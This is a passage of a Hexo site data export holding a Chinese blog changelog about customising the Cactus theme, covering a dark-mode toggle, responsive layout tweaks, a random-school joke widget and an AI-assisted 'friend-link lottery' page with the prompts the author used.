class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后加上各部分的代码……（有点多，不放了）</p>\n<p>一通倒腾，搞定了~ <a href=\"/features/\">修改特性传送门</a></p>\n<p>并且为了方便，加了个toc属性，通过<code>layout.ejs</code>里面判断<code>page.toc</code>是否为真来强制显示toc</p>\n<p>希望不要有bug</p>\n<h3 id=\"给图片加边框\"><a href=\"#给图片加边框\" class=\"headerlink\" title=\"给图片加边框\"></a>给图片加边框</h3><p>从背景相似的地方截图根本看不清边界，给所有图片加了一个边框~</p>\n<h3 id=\"修复了一些之前产的史\"><a href=\"#修复了一些之前产的史\" class=\"headerlink\" title=\"修复了一些之前产的史\"></a>修复了一些之前产的史</h3><p>如题，发现于原版Cactus有点不一样，经查发现<code>.light selector</code>无法生效，需替换成</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">selector</span><br><span class=\"line\">    <span class=\"selector-class\">.light</span> &amp;</span><br><span class=\"line\">        ...</span><br></pre></td></tr></table></figure>\n\n<p>并且将desktop版的nav改回了仅在顶部附近显示（这里我发现阈值过小，导致无法重新显示，于是调大了阈值，并且在已经写了这么多NativeJS的情况下发现他竟然有jQuery……）</p>\n<h3 id=\"上线“友链抽奖机”\"><a href=\"#上线“友链抽奖机”\" class=\"headerlink\" title=\"上线“友链抽奖机”\"></a>上线“友链抽奖机”</h3><p><del>虽然一个友链都没有</del> ，但是“友链抽奖机”终于写完了！</p>\n<p>这个抽奖机拥抱AI，因为我实在不想写前端了！用的D老师，效果还不错~</p>\n<p>快去<a href=\"/friends/\">抽友链</a>吧！</p>\n<p>对了，把D老师之前几版也放一下，下面的都是D老师根据提示词自己写出来的~</p>\n<style>\n    details {\n        border: 1px solid;\n        padding: 5px;\n        border-radius: 5px;\n    }\n\n    details:open summary {\n        border-bottom: 1px solid;\n    }\n</style>\n\n<ul>\n<li><a href=\"/friends/draft/ds_v1.html\">V1</a> -&gt; 最原始的简单提示词，看起来不错，就是AI味太大了<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链有几种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、蓝、绿、金、红），旋转由快到慢，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链 分，显示抽到的最高品质的颜色，点击后弹出浮层，显示友链详情和抽到过的品质列表及数量，未抽中的留灰色占位，最后给出一个作弊按钮用来一键解锁所有基础友链。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点</details></li>\n<li><a href=\"/friends/draft/ds_v2.html\">V2</a> -&gt; 让D老师接受我的“现代”审美，至少AI味没有那么大了<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details></li>\n<li><a href=\"/friends/draft/ds_v3.html\">V3</a> -&gt; 从V2的提示词进一步修改，最终版就是从这版上改的<details><summary>提示词</summary>我想给我的博客写一个“友链抽奖机”，有一张类似牌的元素初始展示背面，点击后3D快速旋转，每转一圈随机一个友链（包括方形图片+大字名称+小字描述+加粗网址），每个友链都有五种不同“品质”随机出现，用不同背景、前景色效果展示（比如默认、绿、蓝、金、红），旋转由快匀速变慢，每次背面朝外时随机刷新背面的友链和品质，用JS实现，最后停在某个品质的友链上后就向localStorage存储一下，记录抽到了哪些友链及品质，再写一个展示抽到的友链的页面，以友链分，显示与抽取的卡片类似，颜色选抽到的最高品质的颜色，未抽中则为灰色，并显示？？？，根据品质、数量降序排列，并有各品质收集进度，有复选框来决定是否显示未抽中的，有一个搜索的功能（未抽中的也按名称参与，但仍显示？？？），给出一个作弊按钮“一键解锁”用来给未抽中过的友链添加一个普通品质，添加导入导出功能，点击后弹出浮层，左侧是较大的头像，右上是标题、说明、链接，若超出则显示滚动条，右下留一小条背景稍不同，用倾斜圆角矩形和对应颜色表示某种品质的牌，矩形里数字代表抽到的次数（注意2位数以上字体大小），若未抽到对应品质则背景为灰色、标0，矩形下方给出品质名称，注意间距。最后给出一个danger的删除数据按钮。友链数据记录在JS对象中，可能随时间更改，编写代码时请注意这一点。两个页面写在一起。我像把它加到已有的界面中，尽可能用默认值来兼容上下文样式，并且除了卡牌、品质等适合使用圆角矩形的地方，尽可能采用尖角矩形、非渐变，按钮强调下缘的简约风格</details></li>\n</ul>\n<p>基于V3，通过反复向D老师提要求+自己修，慢慢地完成了这个“浩大工程”</p>\n<p><img src=\"/image-5.png\" alt=\"alt text\"></p>\n<p>（完全想象不出来自己写这么大托需要多久，我上一个纯手写的HTML前端只有798行41297字符）</p>\n<p>不过D老师还不是万能的，比如旋转动画写不出来，偶尔听不懂人话（不过不排除是上下文过大导致的），最后修改还得是我来做</p>\n<p><span style=\"background-color: currentColor\">听说GPT、Gemini效果很好，不知道长城外的AI怎么样呢？</span></p>\n<h3 id=\"进一步改进“友链抽奖机”\"><a href=\"#进一步改进“友链抽奖机”\" class=\"headerlink\" title=\"进一步改进“友链抽奖机”\"></a>进一步改进“友链抽奖机”</h3><p>突然想到会不会有人把博客名字和介绍写的特别特别长，添加了截断，并且让友链详情的url会自动滚动了！</p>\n<p>然后还加入了友链消失和上新提示，加了一个友链全收集提示</p>\n<p>还加了体力全恢复的时间和对应的时刻</p>\n<p>啊吧啊吧啊吧……</p>\n<script>\n    // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>","excerpt":"","more":"<p>因为自己非常追求细节，同时也想分享一下开发过程中的琐事与技巧，特此设立“小站修补琐记”板块，持续更新！</p>\n<h2 id=\"2025-10-2025-11\"><a href=\"#2025-10-2025-11\" class=\"headerlink\" title=\"2025.10 + 2025.11\"></a>2025.10 + 2025.11</h2><h3 id=\"明暗切换\"><a href=\"#明暗切换\" class=\"headerlink\" title=\"明暗切换\"></a>明暗切换</h3><p>Cactus模板内置了几种颜色主题，但是只能通过配置文件切换，不能动态切换。</p>\n<p>动态切换明暗的核心是通过对<code>html</code>元素（或者<code>body</code>元素）添加如<code>light</code>&#x2F;<code>dark</code>这样的class，再在CSS分别写入对应的颜色等规则完成的</p>\n<p>经过观察，CSS使用<a href=\"https://stylus-lang.com/\">Stylus</a>编译，颜色被放在了<code>themes/cactus/css/_color</code>下的各个文件里，以变量形式存储，而Stylus支持<a href=\"https://stylus-lang.com/docs/import.html#block-level-import\">块级导入</a>，所以，我们可以把导入从这样</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">@import</span> <span class=\"string\">&quot;_colors/&quot;</span> + <span class=\"variable\">$colors</span></span><br></pre></td></tr></table></figure>\n\n<p>写成</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.light</span></span><br><span class=\"line\">    <span class=\"keyword\">@import</span> <span class=\"string\">&quot;_colors/&quot;</span> + <span class=\"variable\">$colors</span>-light</span><br><span class=\"line\"><span class=\"selector-class\">.night</span></span><br><span class=\"line\">    <span class=\"keyword\">@import</span> <span class=\"string\">&quot;_colors/&quot;</span> + <span class=\"variable\">$colors</span>-night</span><br></pre></td></tr></table></figure>\n\n<p>而<code>$colors</code>这个变量在<code>$_variables.styl</code>里面定义，进行相应修改即可</p>\n<p>但仅仅这样在编译的时候会报错，原因是在CSS的定义中用到了<code>darken</code>之类的函数，这些函数会在编译时执行，然后硬编码进生成的.css文件中，然而块级定义导致这些变量没有明确的值，无法执行函数，故报错终止。</p>\n<p>最好的办法就是将这些定义的<code>.light</code>&#x2F;<code>.night</code>分开定义，比如，把下面的</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*::-webkit-scrollbar-thumb<span class=\"selector-pseudo\">:active</span></span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"built_in\">darken</span>(<span class=\"variable\">$color</span>-scrollbar, <span class=\"number\">30%</span>)</span><br></pre></td></tr></table></figure>\n\n<p>写成</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*::-webkit-scrollbar-thumb<span class=\"selector-pseudo\">:active</span></span><br><span class=\"line\">  <span class=\"selector-class\">.night</span> &amp;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"built_in\">darken</span>(<span class=\"variable\">$color</span>-scrollbar, <span class=\"number\">30%</span>)</span><br><span class=\"line\">  <span class=\"selector-class\">.light</span> &amp;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"built_in\">darken</span>(<span class=\"variable\">$color</span>-scrollbar, <span class=\"number\">30%</span>)</span><br></pre></td></tr></table></figure>\n\n<p>但是我不保证这种方法的可行性，因为我一开始不知道Stylus可以块级导入，就手动把所有的变量加上<code>-light-</code>&#x2F;<code>-dark-</code>中缀，并将颜色直接硬编码在<code>style.styl</code>里面（所以才说拉了坨大的，而且有一大堆漏的）</p>\n<p>然后就是增加切换按钮和持久化存储功能，这里通过修改模板<code>layout.ejs</code>实现</p>\n<p>在<code>head.ejs</code>里面添加一段JavaScript，用于切换主题</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">colorScheme = <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">getItem</span>(<span class=\"string\">&#x27;color-scheme&#x27;</span>) || (<span class=\"title function_\">matchMedia</span>(<span class=\"string\">&#x27;(prefers-color-scheme: dark)&#x27;</span>).<span class=\"property\">matches</span>?<span class=\"string\">&quot;night&quot;</span>:<span class=\"string\">&quot;light&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(colorScheme===<span class=\"string\">&quot;light&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> classlist = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;html&quot;</span>).<span class=\"property\">classList</span></span><br><span class=\"line\">    classlist.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;night&#x27;</span>)</span><br><span class=\"line\">    classlist.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;light&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先尝试从<code>localStorage</code>里面读取是否已有主题，如果没有，就根据媒体查询同步浏览器主题。为了防止JS莫名其妙的炸掉，在<code>html</code>上加了<code>.night</code>，所以如果选择亮主题的话就要切换。</p>\n<p>然后是切换按钮，在<code>layout.ejs</code>的<code>body</code>下面添加</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;position: fixed; right: 0; bottom: 0; z-index: 999; margin: 10px;&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sun&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: none; background: none; color:white; cursor: pointer;&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;switchColorScheme(&#x27;light&#x27;)&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 25px; height: 25px;&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 24 24&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;currentColor&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M0 0h24v24H0z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;moon&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: none; background: none; color: black; cursor: pointer;&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;switchColorScheme(&#x27;night&#x27;)&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 25px; height: 25px;&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 24 24&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;currentColor&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M0 0h24v24H0z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">path</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在里面的图标是从<a href=\"https://remixicon.com/\">这个网站</a>复制的矢量图</p>\n<p>以及切换逻辑</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">colorScheme = <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">getItem</span>(<span class=\"string\">&#x27;color-scheme&#x27;</span>) || (<span class=\"title function_\">matchMedia</span>(<span class=\"string\">&#x27;(prefers-color-scheme: dark)&#x27;</span>).<span class=\"property\">matches</span>?<span class=\"string\">&quot;night&quot;</span>:<span class=\"string\">&quot;light&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span>(colorScheme===<span class=\"string\">&#x27;light&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">switchColorScheme</span>(<span class=\"params\">scheme</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">localStorage</span>.<span class=\"title function_\">setItem</span>(<span class=\"string\">&quot;color-scheme&quot;</span>, scheme)</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(scheme===<span class=\"string\">&#x27;light&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> classlist = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;html&quot;</span>).<span class=\"property\">classList</span></span><br><span class=\"line\">        classlist.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;night&#x27;</span>)</span><br><span class=\"line\">        classlist.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;light&#x27;</span>)</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;sun&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;moon&quot;</span>).<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&quot;none&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> classlist = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;html&quot;</span>).<span class=\"property\">classList</span></span><br><span class=\"line\">        classlist.<span class=\"title function_\">add</span>(<span class=\"string\">&#x27;night&#x27;</span>)</span><br><span class=\"line\">        classlist.<span class=\"title function_\">remove</span>(<span class=\"string\">&#x27;light&#x27;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来就可以自如切换啦~</p>\n<h3 id=\"返回按钮\"><a href=\"#返回按钮\" class=\"headerlink\" title=\"返回按钮\"></a>返回按钮</h3><p><del>有一点小瑕疵，因为我加的返回按钮是通过<code>history.go(-1)</code>实现的，所以在这里切换主题后通过返回按钮返回后需要刷新才会生效，并且在通过目录跳转过的情况下这个按钮会返回上一个锚点，而不是上一个界面。</del><br>已修复，现在返回按钮通过<code>location.href = document.referrer || &#39;/&#39;</code>实现（但还是有bug，如果从一篇文章跳到另一篇，用返回键就会来回跳转，或许应该用<code>SessionStorage</code>？）</p>\n<h3 id=\"左上角的博客名称\"><a href=\"#左上角的博客名称\" class=\"headerlink\" title=\"左上角的博客名称\"></a>左上角的博客名称</h3><p>最开始是没想适配手机的，但是后面还是适配了</p>\n<p>添加没什么，主要讲讲如何适配</p>\n<p>首先，在电脑这种大地方，在左上角显示并不多余，而在手机的首页和关于页等地，有一个博客名称，故在这些页隐藏；在文章页，屏幕比较窄的话图标会和字重叠，干脆显示成一整行，中间有一个过渡态，就是刚刚穿过文字显示边界的时候，和“返回”按钮挨得特别近，不好看，就让它挨着左上角了</p>\n<p><img src=\"/GIF%202025-11-4%2020-49-48.gif\"></p>\n<p><img src=\"/GIF%202025-11-4%2020-50-19.gif\"></p>\n<p>其实对右边那个工具栏我也有修改，让它翻下去不会消失，但是页面变窄之后会和左上角的重合，就是以此分界过渡态和横条状态</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// is_post() 时</span><br><span class=\"line\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">1468px</span>) &#123; // 过渡态</span><br><span class=\"line\">    <span class=\"selector-class\">.hide-on-phone</span>&#123;</span><br><span class=\"line\">        <span class=\"attribute\">margin</span>: <span class=\"number\">0px</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-bottom-left-radius</span>: <span class=\"number\">0px</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-top-right-radius</span>: <span class=\"number\">0px</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-top</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-left</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">630px</span>) &#123; // 横条状态</span><br><span class=\"line\">    <span class=\"selector-class\">.hide-on-phone</span>&#123;</span><br><span class=\"line\">        <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-radius</span>: <span class=\"number\">0</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">        <span class=\"attribute\">border-bottom</span>: gray <span class=\"number\">1px</span> solid <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// !is_post() 时</span><br><span class=\"line\"><span class=\"keyword\">@media</span> screen <span class=\"keyword\">and</span> (<span class=\"attribute\">max-width</span>: <span class=\"number\">1468px</span>) &#123; // 直接隐藏</span><br><span class=\"line\">    <span class=\"selector-class\">.hide-on-phone</span>&#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: none <span class=\"meta\">!important</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"随机学校\"><a href=\"#随机学校\" class=\"headerlink\" title=\"随机学校\"></a>随机学校</h3><p>这个是一个很简单的JavaScript动态界面，每次会用<code>Math.floor(Math.random()*3)</code>生成随机数<code>0</code>&#x2F;<code>1</code>&#x2F;<code>2</code>，然后用<code>document.getElementById(...).innerText = ...</code>完成动态修改</p>\n<p>并且为了<del>防止小孩误食</del>防止真的有人去报考<span style=\"text-decoration: underline wavy red;\" title=\"这是《人民日报》报道过的“野鸡大学”\" onclick=\"alert('我说没有就没有！')\">中国邮电大学</span><sup><a id=\"baikePortal\" href=\"https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/7527114\">百度百科传送门</a></sup>，更新加上了红色波浪线警示，并且将鼠标放置在其上时会显示提示（前面的这个也有），并且可以点击刷新（前面的没有），并且人性化地考虑到一顿狂点可能会被选中而影响美观，特意添加了<code>user-select: none</code>（前面那个也没有）</p>\n<style>\n    .light #baikePortal {\n        color: blue;\n    }\n    .night #baikePortal {\n        color: lightblue;\n    }\n</style>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">......目前就读于<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;studyIn&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;text-decoration: underline wavy red; cursor: pointer; user-select: none;&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;Not Truth&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span>......</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    studyIn = [<span class=\"string\">&quot;北京邮电学院&quot;</span>, <span class=\"string\">&quot;中国邮电大学&quot;</span>, <span class=\"string\">&quot;北京等通知大学&quot;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    randomStudyIn = <span class=\"function\">()=&gt;</span>&#123;<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;studyIn&quot;</span>).<span class=\"property\">innerText</span> = studyIn[<span class=\"title class_\">Math</span>.<span class=\"title function_\">floor</span>(<span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>()*<span class=\"number\">3</span>)]&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"title function_\">randomStudyIn</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span 